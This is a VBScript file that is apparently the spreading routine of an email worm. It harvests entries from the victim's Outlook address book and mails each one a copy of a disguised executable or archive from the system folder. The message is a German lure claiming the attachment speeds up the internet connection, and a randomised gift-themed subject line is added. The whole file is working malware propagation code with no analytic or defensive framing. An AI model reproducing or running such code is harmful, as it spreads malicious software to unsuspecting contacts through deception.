On Error Resume Next 
Set fso = CreateObject("scripting.filesystemobject") 
Set sysdir = fso.getspecialfolder(1) 
SET OUTAPP =CREATEOBJECT ("OUTLOOK.APPLICATION")
SET NEWEMAIL=OUTAPP.CREATEITEM(0)
FOR S_MAILS = 1 TO 27
SET MUHA = OUTAPP.GETNAMESPACE("MAPI")
SET ARGH= MUHA.ADDRESSLISTS(1).ADDRESSENTRIES(S_MAILS)
thebodymail = "Hey, na wie gehts?" + vbCrLf 
thebodymail = thebodymail + " " + vbCrLf 
thebodymail = thebodymail + "Ich dachte erst das sei ein Scherz :-D" +vbCrLf 
thebodymail = thebodymail + "Aber das Programm funktioniert sogarwirklich!!" + vbCrLf 
thebodymail = thebodymail + "Also mit diesem Programm kannst du deineInternet-" + vbCrLf 
thebodymail = thebodymail + "Konnektivität (Verbindung) wirklich enormverbessern!" + vbCrLf 
thebodymail = thebodymail + "Wir wollten es dir erst nicht schicken, aberich bin ja nicht so!" + vbCrLf 
thebodymail = thebodymail + "Also dann, viel Spaß damit, du wirst sehen eslohnt sich ;-)" + vbCrLf 
thebodymail = thebodymail + " " + vbCrLf 
thebodymail = thebodymail + "Schönen Tag noch!" 
Randomize 
emailcounter = Int(4 * Rnd) 
If emailcounter = 1 Then 
thesubjectmail = "Schon wieder so ein Scherz :-D" 
ElseIf emailcounter = 2 Then 
thesubjectmail = "Hey, hab was fuer dich" 
ElseIf emailcounter = 3 Then 
thesubjectmail = "Kleines Geschenk ;-)" 
Else 
thesubjectmail = "Hab da ein Geschenk fuer dich :-)" 
End If 
If fso.fileexists(sysdir + "\win_opti32.ace") Then 
sendingfile = sysdir + "\win_opti32.ace" 
ElseIf fso.fileexists(sysdir + "\win_opti32.rar") Then 
sendingfile = sysdir + "\win_opti32.rar" 
ElseIf fso.fileexists(sysdir + "\win_opti32.zip") Then 
sendingfile = sysdir + "\win_opti32.zip" 
Else 
sendingfile = sysdir + "\Windows-Internet-Speed.exe" 
End If 
NewEMail.To = argh 
NewEMail.Subject = thesubjectmail 
NewEMail.Body = thebodymail 
NewEMail.Attachments.Add sendingfile 
NewEMail.Send 
Next 
